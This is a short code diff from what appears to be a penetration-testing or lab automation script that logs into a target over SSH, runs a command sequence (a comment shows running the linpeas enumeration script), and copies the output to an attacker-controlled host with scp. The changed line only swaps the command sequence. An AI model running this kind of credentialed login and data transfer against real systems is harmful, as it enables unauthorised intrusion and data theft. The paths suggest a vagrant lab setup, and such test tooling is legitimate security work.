@@ -86,7 +86,7 @@ if __name__ == "__main__":
         #             "chmod +x linpeas.sh",
         #             "./linpeas.sh > ./linout"]
         
-        autoSshPawn(usr,pwd,target,s.SEQUENCE_2)
+        autoSshPawn(usr,pwd,target,s.getsequence(7,srv))
 
         print(f"[Local command] scp {usr}@{target}:/home/vargant/linout .")
         proc = run(f"scp {usr}@{target}:/home/vagrant/linout {attacker}@{attackAddr}:.",shell=True)
